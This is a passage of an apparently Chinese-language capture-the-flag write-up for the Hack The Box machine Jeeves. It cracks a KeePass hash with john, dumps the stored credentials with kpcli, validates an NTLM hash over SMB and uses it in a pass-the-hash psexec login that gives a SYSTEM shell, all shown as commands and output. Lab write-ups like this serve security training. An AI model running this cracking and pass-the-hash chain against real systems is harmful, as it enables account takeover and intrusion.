CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

修改格式。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ cat kp.hash
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

使用 john 破解得到密码 `moonshine1`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash
[sudo] password for kali:
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (?)
1g 0:00:00:09 DONE (2026-10-14 02:16) 0.1036g/s 5696p/s 5696c/s 5696C/s nick18..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

使用 kpcli 连接数据库，根目录下有一个CEH 组，组里有八个条目。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ kpcli --kdb=CEH.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls -R /
=== Groups ===
CEH/
kpcli:/> ls -R CEH/
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/> stats
File: CEH.kdbx      
Key file: N/A
Name: 
Description:
| 
KeePass file version: 2 and KDBX v3.1
Encryption type:      rijndael
Encryption rounds:    6000
Cipher:               aes
Compression:          1
Number of groups:     7
Number of entries:    8
Entries with passwords of length:
  -    0: 1
  -  1-7: 1
  - 8-11: 2
  -  20+: 4

```

分别查看八个条目，Backup stuff 中有一对 LM:HTML 哈希。

```bash
kpcli:/> cd /CEH
kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes:
kpcli:/CEH> show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH> show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH> show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login
kpcli:/CEH> show -f 4

Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH> show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/CEH> show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 
kpcli:/CEH> show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on

```

尝试一下，DC Recovery PW 那条明文口令失效，哈希通过，返回 Pwn3d。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ nxc smb 10.129.228.112 -u administrator -p 'S1TjAtJHKsugh9oC4VZl'
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ nxc smb 10.129.228.112 -u administrator -H e0fb1fb85756c24235ff238cbe81fe00
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

使用 psexec 可以连上。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Jeeves]
└─$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.228.112.....
[*] Found writable share ADMIN$
[*] Uploading file zCVXheMx.exe
[*] Opening SVCManager on 10.129.228.112.....
[*] Creating service qyDN on 10.129.228.112.....
[*] Starting service qyDN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

```bash
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,635,591,680 bytes free

C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.

```